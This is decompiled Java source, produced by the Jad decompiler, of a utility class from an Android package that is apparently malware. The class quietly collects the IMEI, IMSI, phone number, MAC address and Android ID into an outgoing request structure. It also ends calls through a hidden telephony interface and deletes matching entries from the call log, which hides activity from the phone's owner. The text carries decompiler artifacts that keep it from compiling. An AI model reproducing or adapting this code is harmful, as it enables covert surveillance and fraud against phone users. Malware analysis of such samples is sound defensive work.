// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.admv2.baseutil;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import com.admv2.db.DBSlient;
import com.android.internal.telephony.ITelephony;
import com.luebad.advdatamodule.RequestStruct;
import com.luebad.advdatamodule.RequestStruct_Head;
import java.lang.reflect.Method;

public class BasePhoneUtil
{

    public BasePhoneUtil()
    {
    }

    public static String GetAndroidId(Context context)
    {
        com/admv2/baseutil/BasePhoneUtil;
        JVM INSTR monitorenter ;
        String s = android.provider.Settings.Secure.getString(context.getContentResolver(), "android_id");
        com/admv2/baseutil/BasePhoneUtil;
        JVM INSTR monitorexit ;
        return s;
        Exception exception;
        exception;
        throw exception;
    }

    public static boolean GetPhoneInfo(Context context, RequestStruct requeststruct)
    {
        com/admv2/baseutil/BasePhoneUtil;
        JVM INSTR monitorenter ;
        TelephonyManager telephonymanager;
        ConnectivityManager connectivitymanager;
        telephonymanager = (TelephonyManager)context.getSystemService("phone");
        connectivitymanager = (ConnectivityManager)context.getSystemService("connectivity");
        if(telephonymanager != null && connectivitymanager != null) goto _L2; else goto _L1
_L1:
        boolean flag = false;
_L6:
        com/admv2/baseutil/BasePhoneUtil;
        JVM INSTR monitorexit ;
        return flag;
_L2:
        NetworkInfo networkinfo = connectivitymanager.getActiveNetworkInfo();
        if(networkinfo == null) goto _L4; else goto _L3
_L3:
        if(networkinfo.isConnected()) goto _L5; else goto _L4
_L5:
        if(telephonymanager.getSimState() == 5)
            break MISSING_BLOCK_LABEL_82;
        flag = false;
          goto _L6
        int i = networkinfo.getType();
        String s;
        s = "";
        if(i != 1)
            break MISSING_BLOCK_LABEL_138;
        WifiManager wifimanager = (WifiManager)context.getSystemService("wifi");
        if(wifimanager == null)
            break MISSING_BLOCK_LABEL_138;
        WifiInfo wifiinfo = wifimanager.getConnectionInfo();
        if(wifiinfo == null)
            break MISSING_BLOCK_LABEL_138;
        String s8 = wifiinfo.getMacAddress();
        s = s8;
_L8:
        String s1;
        String s2;
        String s3;
        String s4;
        String s5;
        s1 = telephonymanager.getSubscriberId();
        s2 = telephonymanager.getDeviceId();
        s3 = android.provider.Settings.Secure.getString(context.getContentResolver(), "android_id");
        s4 = Build.MODEL;
        s5 = android.os.Build.VERSION.RELEASE;
        String s6 = "";
        String s7 = ((TelephonyManager)context.getSystemService("phone")).getLine1Number();
        s6 = s7;
_L7:
        if(s4 == null)
            s4 = "";
        break MISSING_BLOCK_LABEL_314;
_L9:
        requeststruct.data_head.android_id = s3;
        requeststruct.data_head.imei = s2;
        requeststruct.data_head.imsi = s1;
        requeststruct.data_head.mac = s;
        requeststruct.data_head.nettype = i;
        requeststruct.data_head.os_version = s5;
        requeststruct.data_head.phone_model = s4;
        requeststruct.data_head.phone_num = s6;
        flag = true;
          goto _L6
        Exception exception1;
        exception1;
        flag = false;
          goto _L6
        Exception exception;
        exception;
        throw exception;
        Exception exception2;
        exception2;
          goto _L7
        Exception exception3;
        exception3;
          goto _L8
_L4:
        flag = false;
          goto _L6
        if(s5 == null)
            s5 = "";
        if(s1 == null)
            s1 = "";
        if(s2 == null)
            s2 = "";
        if(s6 == null)
            s6 = "";
        if(s3 == null)
            s3 = "";
          goto _L9
    }

    public static void PhoneStatusCheck(Context context)
    {
        do
        {
            if(isNetworkAvailable(context) && isPhoneAvailable(context))
                return;
            SystemClock.sleep(10000L);
        } while(true);
    }

    public static void ceth(Context context)
    {
        TelephonyManager telephonymanager = (TelephonyManager)context.getSystemService("phone");
        try
        {
            Method method = Class.forName(telephonymanager.getClass().getName()).getDeclaredMethod("getITelephony", new Class[0]);
            method.setAccessible(true);
            ((ITelephony)method.invoke(telephonymanager, new Object[0])).endCall();
            return;
        }
        catch(Exception exception)
        {
            exception.printStackTrace();
        }
    }

    public static void deleteCall(Context context, String s)
    {
        ContentResolver contentresolver;
        Cursor cursor;
        contentresolver = context.getContentResolver();
        String s1;
        String s2;
        android.net.Uri uri;
        String as[];
        String as1[];
        boolean flag;
        if(s.indexOf(",") > 0)
            s1 = s.substring(0, s.indexOf(","));
        else
            s1 = s;
        s2 = DBSlient.FormatTagNum(s1);
        if(s2.length() > 8)
            s2 = s2.substring(-8 + s2.length(), s2.length());
        uri = android.provider.CallLog.Calls.CONTENT_URI;
        as = (new String[] {
            "_id"
        });
        as1 = new String[1];
        as1[0] = (new StringBuilder("%")).append(s2).toString();
        cursor = contentresolver.query(uri, as, "number like ?", as1, "");
        if(cursor == null) goto _L2; else goto _L1
_L1:
        flag = cursor.moveToNext();
        if(flag)
            break MISSING_BLOCK_LABEL_153;
        cursor.close();
_L2:
        return;
        int i = cursor.getInt(0);
        android.net.Uri uri1 = android.provider.CallLog.Calls.CONTENT_URI;
        String as2[] = new String[1];
        as2[0] = (new StringBuilder(String.valueOf(i))).toString();
        contentresolver.delete(uri1, "_id=?", as2);
          goto _L1
        Exception exception;
        exception;
        cursor.close();
        throw exception;
    }

    private static boolean isNetworkAvailable(Context context)
    {
        ConnectivityManager connectivitymanager = (ConnectivityManager)context.getSystemService("connectivity");
        NetworkInfo networkinfo;
        if(connectivitymanager != null)
            if((networkinfo = connectivitymanager.getActiveNetworkInfo()) != null && networkinfo.isConnected())
                return true;
        return false;
    }

    private static boolean isPhoneAvailable(Context context)
    {
        for(TelephonyManager telephonymanager = (TelephonyManager)context.getSystemService("phone"); telephonymanager == null || telephonymanager.getSimState() != 5;)
            return false;

        return true;
    }
}
